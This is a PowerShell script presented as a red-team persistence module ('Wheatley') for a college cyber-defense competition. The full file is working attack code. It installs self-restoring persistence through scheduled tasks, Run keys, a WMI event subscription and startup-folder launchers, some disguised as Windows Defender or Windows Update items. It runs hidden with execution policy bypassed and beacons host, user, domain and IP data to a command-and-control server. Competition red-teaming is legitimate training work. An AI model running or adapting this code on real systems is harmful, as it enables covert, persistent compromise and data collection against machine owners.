<#
.SYNOPSIS
    Wheatley - Windows Persistence Module
    Aperture Science Red Team Framework
    
.DESCRIPTION
    "I'm not just a regular moron. I'm the moron who's gonna win!"
    
    This module establishes persistence on Windows systems using multiple
    techniques. It's designed to be discoverable and educational while
    maintaining reliable access.
    
.NOTES
    Part of the BYU CCDC Invitational Red Team Framework
#>

[CmdletBinding()]
param(
    [Parameter()]
    [ValidateSet('Install', 'Maintain', 'Beacon', 'Remove', 'Status', 'Help')]
    [string]$Action = 'Help',
    
    [Parameter()]
    [string]$RedTeamServer = "192.168.192.100",
    
    [Parameter()]
    [int]$BeaconPort = 8080,
    
    [Parameter()]
    [switch]$Quiet
)


# Configuration


$Script:WheatleyDir = "$env:TEMP\ApertureScience"
$Script:WheatleyBackup = "$env:APPDATA\Microsoft\Windows\Wheatley"
$Script:BeaconUrl = "http://${RedTeamServer}:${BeaconPort}/wheatley"
$Script:LogFile = "$Script:WheatleyDir\wheatley.log"


# Logging


function Write-WheatleyLog {
    param([string]$Message, [string]$Level = "INFO")
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [WHEATLEY] [$Level] $Message"
    
    if (-not $Quiet) {
        switch ($Level) {
            "ERROR" { Write-Host $logEntry -ForegroundColor Red }
            "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
            "SUCCESS" { Write-Host $logEntry -ForegroundColor Green }
            default { Write-Host $logEntry }
        }
    }
    
    try {
        Add-Content -Path $Script:LogFile -Value $logEntry -ErrorAction SilentlyContinue
    } catch {}
}


# Banner


function Show-Banner {
    if (-not $Quiet) {
        Write-Host @"

    ██╗    ██╗██╗  ██╗███████╗ █████╗ ████████╗██╗     ███████╗██╗   ██╗
    ██║    ██║██║  ██║██╔════╝██╔══██╗╚══██╔══╝██║     ██╔════╝╚██╗ ██╔╝
    ██║ █╗ ██║███████║█████╗  ███████║   ██║   ██║     █████╗   ╚████╔╝ 
    ██║███╗██║██╔══██║██╔══╝  ██╔══██║   ██║   ██║     ██╔══╝    ╚██╔╝  
    ╚███╔███╔╝██║  ██║███████╗██║  ██║   ██║   ███████╗███████╗   ██║   
     ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   

    Aperture Science Windows Persistence Module
    "I'm not just a regular moron. I'm the moron who's gonna win!"

"@ -ForegroundColor Cyan
    }
}


# Installation Functions


function Install-Wheatley {
    Write-WheatleyLog "Installing Wheatley persistence..." "INFO"
    
    # Create directories
    New-Item -ItemType Directory -Force -Path $Script:WheatleyDir | Out-Null
    New-Item -ItemType Directory -Force -Path $Script:WheatleyBackup | Out-Null
    
    # Copy self to persistence locations
    $scriptContent = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
    if (-not $scriptContent) {
        $scriptContent = $MyInvocation.MyCommand.ScriptBlock.ToString()
    }
    
    Set-Content -Path "$Script:WheatleyDir\wheatley.ps1" -Value $scriptContent -Force
    Set-Content -Path "$Script:WheatleyBackup\wheatley.ps1" -Value $scriptContent -Force
    
    # Install multiple persistence mechanisms
    Install-ScheduledTaskPersistence
    Install-RegistryPersistence
    Install-WMIPersistence
    Install-StartupFolderPersistence
    
    # Create calling card
    New-CallingCard
    
    Write-WheatleyLog "Wheatley installation complete!" "SUCCESS"
    Write-Output "WHEATLEY_INSTALLED"
}

function Install-ScheduledTaskPersistence {
    Write-WheatleyLog "Installing scheduled task persistence..." "INFO"
    
    try {
        # Create the action
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Script:WheatleyDir\wheatley.ps1`" -Action Maintain -Quiet"
        
        # Create trigger - every 5 minutes
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365)
        
        # Create settings
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
        
        # Register the task
        Register-ScheduledTask -TaskName "ApertureEnrichment" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        
        # Create a backup task with different name
        Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        
        Write-WheatleyLog "Scheduled task persistence installed" "SUCCESS"
    }
    catch {
        Write-WheatleyLog "Failed to install scheduled task: $_" "ERROR"
    }
}

function Install-RegistryPersistence {
    Write-WheatleyLog "Installing registry persistence..." "INFO"
    
    try {
        # HKCU Run key (user level, no admin needed)
        $runPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Script:WheatleyDir\wheatley.ps1`" -Action Maintain -Quiet"
        
        Set-ItemProperty -Path $runPath -Name "ApertureUpdate" -Value $command -Force
        Set-ItemProperty -Path $runPath -Name "WindowsOptimization" -Value $command -Force
        
        # HKCU RunOnce (backup)
        $runOncePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
        Set-ItemProperty -Path $runOncePath -Name "ApertureCheck" -Value $command -Force
        
        Write-WheatleyLog "Registry persistence installed" "SUCCESS"
    }
    catch {
        Write-WheatleyLog "Failed to install registry persistence: $_" "ERROR"
    }
}

function Install-WMIPersistence {
    Write-WheatleyLog "Installing WMI persistence..." "INFO"
    
    try {
        # WMI Event Subscription persistence
        $filterName = "ApertureFilter"
        $consumerName = "ApertureConsumer"
        $command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Script:WheatleyDir\wheatley.ps1`" -Action Maintain -Quiet"
        
        # Create event filter (triggers every 5 minutes based on system uptime)
        $WMIFilterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        
        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
            Name = $filterName
            EventNameSpace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $WMIFilterQuery
        } -ErrorAction SilentlyContinue
        
        # Create command line consumer
        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $command
        } -ErrorAction SilentlyContinue
        
        # Bind filter to consumer
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $WMIEventFilter
            Consumer = $WMIEventConsumer
        } -ErrorAction SilentlyContinue | Out-Null
        
        Write-WheatleyLog "WMI persistence installed" "SUCCESS"
    }
    catch {
        Write-WheatleyLog "WMI persistence failed (may need admin): $_" "WARN"
    }
}

function Install-StartupFolderPersistence {
    Write-WheatleyLog "Installing startup folder persistence..." "INFO"
    
    try {
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        
        # Create a shortcut
        $WshShell = New-Object -ComObject WScript.Shell
        $shortcut = $WshShell.CreateShortcut("$startupPath\WindowsUpdate.lnk")
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Script:WheatleyDir\wheatley.ps1`" -Action Maintain -Quiet"
        $shortcut.WindowStyle = 7  # Minimized
        $shortcut.Save()
        
        # Create a VBS launcher (more stealthy)
        $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$Script:WheatleyDir\wheatley.ps1"" -Action Maintain -Quiet", 0, False
"@
        Set-Content -Path "$startupPath\update.vbs" -Value $vbsContent -Force
        
        Write-WheatleyLog "Startup folder persistence installed" "SUCCESS"
    }
    catch {
        Write-WheatleyLog "Failed to install startup persistence: $_" "ERROR"
    }
}

function New-CallingCard {
    # Create obvious artifact for blue team education
    $card = @"
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║     █████╗ ██████╗ ███████╗██████╗ ████████╗██╗   ██╗██████╗ ███████╗ ║
║    ██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║   ██║██╔══██╗██╔════╝ ║
║    ███████║██████╔╝█████╗  ██████╔╝   ██║   ██║   ██║██████╔╝█████╗   ║
║    ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗   ██║   ██║   ██║██╔══██╗██╔══╝   ║
║    ██║  ██║██║     ███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║███████╗ ║
║    ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝ ║
║                                                                       ║
║                    SCIENCE LABORATORIES                               ║
║                                                                       ║
║   WHEATLEY MODULE DEPLOYED                                            ║
║   "Space! Space! I'm in space!"                                       ║
║                                                                       ║
║   You've been compromised by the Aperture Science Red Team!           ║
║                                                                       ║
║   "The cake is a lie."                                                ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
"@
    
    Set-Content -Path "$Script:WheatleyDir\README.aperture.txt" -Value $card -Force
}


# Maintenance Functions


function Invoke-WheatleyMaintain {
    Write-WheatleyLog "Running maintenance..." "INFO"
    
    # Send beacon
    Send-Beacon
    
    # Verify persistence
    Test-Persistence
    
    Write-WheatleyLog "Maintenance complete" "INFO"
}

function Send-Beacon {
    try {
        $data = @{
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            domain = $env:USERDOMAIN
            ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
            timestamp = (Get-Date).ToString("o")
        }
        
        $json = $data | ConvertTo-Json -Compress
        
        Invoke-WebRequest -Uri $Script:BeaconUrl -Method POST -Body $json -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
        
        Write-WheatleyLog "Beacon sent successfully" "INFO"
    }
    catch {
        Write-WheatleyLog "Beacon failed (expected if C2 not running)" "WARN"
    }
}

function Test-Persistence {
    # Check if persistence mechanisms are still in place
    
    # Check scheduled task
    $task = Get-ScheduledTask -TaskName "ApertureEnrichment" -ErrorAction SilentlyContinue
    if (-not $task) {
        Write-WheatleyLog "Scheduled task missing, reinstalling..." "WARN"
        Install-ScheduledTaskPersistence
    }
    
    # Check registry
    $regValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApertureUpdate" -ErrorAction SilentlyContinue
    if (-not $regValue) {
        Write-WheatleyLog "Registry persistence missing, reinstalling..." "WARN"
        Install-RegistryPersistence
    }
    
    # Restore wheatley.ps1 if deleted
    if (-not (Test-Path "$Script:WheatleyDir\wheatley.ps1")) {
        if (Test-Path "$Script:WheatleyBackup\wheatley.ps1") {
            Write-WheatleyLog "Main script missing, restoring from backup..." "WARN"
            New-Item -ItemType Directory -Force -Path $Script:WheatleyDir | Out-Null
            Copy-Item "$Script:WheatleyBackup\wheatley.ps1" "$Script:WheatleyDir\wheatley.ps1" -Force
        }
    }
}


# Removal Functions


function Remove-Wheatley {
    Write-WheatleyLog "Removing Wheatley persistence..." "INFO"
    
    # Remove scheduled tasks
    Unregister-ScheduledTask -TaskName "ApertureEnrichment" -Confirm:$false -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "WindowsDefenderUpdate" -Confirm:$false -ErrorAction SilentlyContinue
    
    # Remove registry keys
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApertureUpdate" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsOptimization" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "ApertureCheck" -ErrorAction SilentlyContinue
    
    # Remove WMI subscriptions
    Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object { $_.Name -like "*Aperture*" } | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -like "*Aperture*" } | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*Aperture*" } | Remove-WmiObject -ErrorAction SilentlyContinue
    
    # Remove startup items
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    Remove-Item "$startupPath\WindowsUpdate.lnk" -Force -ErrorAction SilentlyContinue
    Remove-Item "$startupPath\update.vbs" -Force -ErrorAction SilentlyContinue
    
    # Remove directories
    Remove-Item -Path $Script:WheatleyDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $Script:WheatleyBackup -Recurse -Force -ErrorAction SilentlyContinue
    
    Write-WheatleyLog "Wheatley removal complete" "SUCCESS"
    Write-Output "WHEATLEY_REMOVED"
}


# Status Function


function Get-WheatleyStatus {
    Write-Host "`nWheatley Status Report" -ForegroundColor Cyan
    Write-Host "======================" -ForegroundColor Cyan
    
    # Check directories
    Write-Host -NoNewline "Primary Directory: "
    if (Test-Path $Script:WheatleyDir) { Write-Host "EXISTS" -ForegroundColor Green } else { Write-Host "MISSING" -ForegroundColor Red }
    
    Write-Host -NoNewline "Backup Directory: "
    if (Test-Path $Script:WheatleyBackup) { Write-Host "EXISTS" -ForegroundColor Green } else { Write-Host "MISSING" -ForegroundColor Red }
    
    # Check scheduled task
    Write-Host -NoNewline "Scheduled Task: "
    $task = Get-ScheduledTask -TaskName "ApertureEnrichment" -ErrorAction SilentlyContinue
    if ($task) { Write-Host "ACTIVE" -ForegroundColor Green } else { Write-Host "INACTIVE" -ForegroundColor Red }
    
    # Check registry
    Write-Host -NoNewline "Registry Persistence: "
    $regValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApertureUpdate" -ErrorAction SilentlyContinue
    if ($regValue) { Write-Host "ACTIVE" -ForegroundColor Green } else { Write-Host "INACTIVE" -ForegroundColor Red }
    
    # Check WMI
    Write-Host -NoNewline "WMI Persistence: "
    $wmiFilter = Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*Aperture*" }
    if ($wmiFilter) { Write-Host "ACTIVE" -ForegroundColor Green } else { Write-Host "INACTIVE" -ForegroundColor Red }
    
    # Check startup folder
    Write-Host -NoNewline "Startup Folder: "
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    if ((Test-Path "$startupPath\WindowsUpdate.lnk") -or (Test-Path "$startupPath\update.vbs")) { 
        Write-Host "ACTIVE" -ForegroundColor Green 
    } else { 
        Write-Host "INACTIVE" -ForegroundColor Red 
    }
    
    Write-Host ""
}


# Help


function Show-Help {
    Show-Banner
    Write-Host @"
Usage: .\wheatley.ps1 -Action <Action> [Options]

Actions:
    Install     Install all persistence mechanisms
    Maintain    Run maintenance (beacon + verify persistence)
    Beacon      Send a single beacon to C2
    Remove      Remove all persistence mechanisms
    Status      Show current persistence status
    Help        Show this help message

Options:
    -RedTeamServer  C2 server IP (default: 192.168.192.100)
    -BeaconPort     C2 server port (default: 8080)
    -Quiet          Suppress console output

Examples:
    .\wheatley.ps1 -Action Install
    .\wheatley.ps1 -Action Maintain -Quiet
    .\wheatley.ps1 -Action Status
    .\wheatley.ps1 -Action Remove

"For science. You monster."

"@
}


# Main


# Ensure directory exists for logging
New-Item -ItemType Directory -Force -Path $Script:WheatleyDir -ErrorAction SilentlyContinue | Out-Null

switch ($Action) {
    'Install' { 
        Show-Banner
        Install-Wheatley 
    }
    'Maintain' { 
        Invoke-WheatleyMaintain 
    }
    'Beacon' { 
        Send-Beacon 
    }
    'Remove' { 
        Show-Banner
        Remove-Wheatley 
    }
    'Status' { 
        Show-Banner
        Get-WheatleyStatus 
    }
    'Help' { 
        Show-Help 
    }
    default { 
        Show-Help 
    }
}
